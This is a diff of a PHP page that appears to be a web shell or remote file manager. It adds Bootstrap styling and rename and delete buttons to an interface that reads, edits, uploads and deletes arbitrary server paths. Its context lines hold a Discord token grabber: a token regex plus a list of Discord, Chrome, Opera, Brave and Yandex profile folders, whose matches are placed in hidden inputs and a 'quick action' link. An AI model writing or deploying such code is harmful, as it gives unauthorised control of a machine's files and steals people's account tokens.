@@ -113,10 +113,12 @@
                 };
             break;
         };
-    };
-    
-    echo '<h3>' . $rawdir . '</h3>';
-    echo '<style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style>';
+    }; ?>
+    <!DOCTYPE html>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+        <h3><?=$rawdir?></h3>
+        <!-- <style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style> -->
+    <?php 
     if(is_dir($rawdir)) {?>
         <form action="" method="post" enctype="multipart/form-data">
             <input type="hidden" name="action" value="upload">
@@ -129,7 +131,6 @@
         <select name="qa" id="qa">
             <option value="chrome" selected>chrome</option>
             <option value="discord">discord</option>
-            <option value="delete">delete</option>
         </select>
         <script>
             document.body.onload = ()=>{
@@ -146,37 +147,88 @@
                                 DESGRAÇA.href = `javascript: console.log(${DESGRAÇA.querySelector('input[name="tokens"]').value})`;
                             }
                         break;
-                        case "delete":
-                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
-                                DESGRAÇA.href = `javascript: if(confirm("O_O")) location.href = "${DESGRAÇA.querySelector('input[name="delete"]').value}"`;
-                            }
-                        break;
                     };
                 }
                 console.log(1);
                 document.querySelector('#qa').addEventListener('change',e=>{socoror(event.target.value.substring(e.target.selectionStart,e.target.selectionEnd))})
                 socoror('chrome')
+                globalThis.rename = function(rawdir, old){
+                    const porro = prompt(`Rename ${old}:`, old)
+                    if(confirm(`Would you like to rename "${old}" to "${porro}"?`)) {
+                        document.querySelector('#rpath').value = rawdir.replace(/\\/g,"\\\\") + "\\\\" + old;
+                        document.querySelector('#newname').value = porro;
+                        document.querySelector('#rform').submit()
+                    }
+                }
+                globalThis.dlete = function(rawdir, old){
+                    if(confirm(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠖⠛⠉⠉⠉⠉⠉⠉⠓⠲⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠋⢀⠄⠊⠀⠀⠤⢀⠀⠒⠢⡀⠀⠀⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⠖⠁⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠄⠀⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢰⠋⠀⠀⢀⣼⠇⢀⡎⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⡟⠀⢠⢂⡾⣿⢆⣿⡑⠀⠀⠀⢀⡀⢸⠀⣿⡀⢸⡄⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀
+⠀⠀⣀⡴⠋⠀⠀⡾⣸⠇⠧⠞⡹⠉⠀⠀⠀⢸⢀⣿⣴⢏⣧⢸⡿⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀
+⠈⠙⠧⢴⡎⠀⠀⣷⣏⣠⣴⣶⣯⡂⠐⠒⠢⠏⠞⣽⠋⠀⠿⢼⢻⠀⠀⠀⠀⠀⢳⣷⠀⠀⠀
+⠀⠀⠀⢸⢠⠄⠀⡿⣿⠋⣎⣸⣟⡏⠀⠀⠀⠀⠀⣿⣿⣿⢦⡀⢸⡂⠀⠀⠐⢸⡀⠛⢤⣀⠀
+⠀⠀⠀⢸⡰⡇⠀⣿⡝⠀⢯⣈⣹⠇⠀⠀⠀⠀⢸⢣⣾⣛⡇⢻⣾⠁⠀⡆⠀⢸⡿⣶⠒⠚⠉
+⠀⠀⠀⠀⢷⣳⡀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠧⣄⡼⠃⠈⡼⠀⢠⡇⠁⣸⢿⠇⠀⠀⠀
+⠀⠀⠀⠀⠈⠛⢷⡀⢿⣷⣤⣀⠀⠀⢄⡀⢀⡀⠀⠀⠀⠀⠀⣰⠇⢐⣼⢁⣴⣿⠟⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⠚⠻⠉⠀⣽⣶⣶⡶⠥⠤⣤⣴⣶⣶⢿⠏⣴⣾⣻⣽⠋⠈⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣷⣿⠈⠑⢚⣿⣟⣿⣿⠛⠋⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⣟⣿⣿⣿⣿⣿⣿⣾⡟⣟⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⢯⣿⡞⢺⣿⣿⣿⣿⣿⠿⣞⡵⣫⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡞⢳⣿⡷⣭⣿⣿⣿⣿⣿⣿⡖⣿⣷⣭⠿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢹⣽⡁⣿⣿⣿⣿⣛⣿⡟⢱⢿⣾⡿⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⣻⣷⣾⣿⣿⣿⣿⡿⡽⣞⣿⠉⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⡇⠀⠀⢸⢏⠉⠿⢳⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⢸⢸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡶⣶⡟⠘⡤⢤⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠁⠀⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)) {
+                        document.querySelector('#dpath').value = rawdir.replace(/\\/g,"\\\\") + "\\\\" + old;
+                        document.querySelector('#dform').submit()
+                    }
+                }
             }
         </script>
-            <table>
+        <form action="" method="get" id="rform">
+            <input type="hidden" name="path" value = "" id="rpath">
+            <input type="hidden" name="action" value = "rename">
+            <input type="hidden" name="newname" value = "" id="newname">
+        </form>
+        <form action="" method="get" id="dform">
+            <input type="hidden" name="path" value = "" id="dpath">
+            <input type="hidden" name="action" value = "delete">
+        </form>
+        
+            <table class = "table table-striped">
                 <tr>
+                    <th>
+                        file name
+                    </th>
                     <th>
                         :3
                     </th>
+                    <th>owo</th>
                     <th>
-                        asdpkfgnhlxfgh
+                        quick action
                     </th>
                 </tr>
             <?php 
                 for($i = 0; $i < count($dir); $i++) {?>
                     <tr>
-                    <td><p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
+                        <td><p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
                     <?php
                     if(is_dir($rawdir . '\\' . $dir[$i])) {
                         echo "\u{1f4c2}";
                     };
-                ?><?=$dir[$i]?></a></p></td>
-                    <td> <a class="q">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
+                    ?><?=$dir[$i]?></a></p></td>
+                    <td>
+                        <button class = "btn btn-warning" onclick='rename(`<?=str_replace("\\","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Rename</button>
+                    </td>
+                    <td>
+                        <button class = "btn btn-danger" onclick='dlete(`<?=str_replace("\\","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Delete</button>
+                    </td>
+                    <td> <a class="q btn btn-info">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
                                     $euqueromematar = '';
                                     $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
                                     $folders=['appdata\\Discord',"appdata\\discordcanary","appdata\\discordptb","localappdata\\Google\\Chrome\\User Data\\Default","appdata\\Opera Software\\Opera Stable","appdata\\Opera Software\\Opera GX Stable","localappdata\\BraveSoftware\\Brave-Browser\\User Data\\Default","localappdata\\Yandex\\YandexBrowser\\User Data\\Default"];
@@ -222,7 +274,7 @@
     } elseif(isset($_REQUEST['action'])){ 
         switch($_REQUEST['action']){
             case 'edit': ?>
-        <p><a href="?path=<?=$rawdir?>"> Return </a></p>
+        <p><a class="btn btn-secondary" href="?path=<?=$rawdir?>"> Return </a></p>
         <?php 
             if(is_dir($rawdir)) { ?>
                 <h2 style="background-color:red;">not a file (its a folder)</h2>
@@ -240,7 +292,7 @@
                                 <?php } else { ?>
                                     <textarea spellcheck="false" name="content" cols="60" rows="30" <?=is_writable($rawdir) ? '' : 'readonly'?>><?=file_get_contents($rawdir)?></textarea>
                                     <p>
-                                        <input style="font-size:20px;" type="submit" value="Confirm">
+                                        <input class="btn btn-primary" type="submit" value="Confirm">
                                     </p>
                                 <?php }
                             }
@@ -289,10 +341,10 @@
         ?>
         <div>
             <h2><?=is_readable($rawdir) ? human_filesize(filesize($rawdir)) : '??????' ?></h2>
-            <p><a href="?path=<?=$voltado?>"> Return </a></p>
-            <p><a href="?path=<?=$rawdir?>&action=delete"> Delete </a></p>
-            <p><a href="?path=<?=$rawdir?>&action=edit"> Edit as text (not recommended if >1mb) </a></p>
-            <button id="rename">Rename</button>
+            <p><a class="btn btn-secondary" href="?path=<?=$voltado?>"> Return </a></p>
+            <p><a class="btn btn-danger" href="?path=<?=$rawdir?>&action=delete"> Delete </a></p>
+            <p><a class="btn btn-primary" href="?path=<?=$rawdir?>&action=edit"> Edit as text (not recommended if >1mb) </a></p>
+            <button class="btn btn-warning" id="rename">Rename</button>
             <form action="" id="rform">
                 <input type="hidden" name="path" value="<?=$rawdir?>">
                 <input type="hidden" name="action" value="rename">
@@ -300,12 +352,12 @@
             </form>
             <form action="">
                 <input type="hidden" name="raw" value="<?=$rawdir?>">
-                <input type="submit" value="View raw file">
+                <input class="btn btn-info"type="submit" value="View raw file">
             </form>
             <form action="">
                 <input type="hidden" name="raw" value="<?=$rawdir?>">
                 <input type="hidden" name="dl" value="1">
-                <input type="submit" value="Download">
+                <input class="btn btn-info" type="submit" value="Download">
             </form>
             <h2 style="background-color:red;"> <?=!is_readable($rawdir) ? 'kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder)' : ''?></h2>
             <h2 style="background-color:red;"> <?=!is_writable($rawdir) ? 'kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder)' : ''?></h2>
@@ -321,7 +373,7 @@
 
             <script>
                 document.querySelector('#rename').onclick = function(){
-                    const porro = prompt("Rename <?=$e[count($e)-1]?>:", <?=$e[count($e)-1]?>)
+                    const porro = prompt("Rename <?=$e[count($e)-1]?>:", "<?=$e[count($e)-1]?>")
                     if(confirm(`Would you like to rename "<?=$e[count($e)-1]?>" to "${porro}"?`)) {
                         document.querySelector('#newname').value = porro;
                         document.querySelector('#rform').submit()
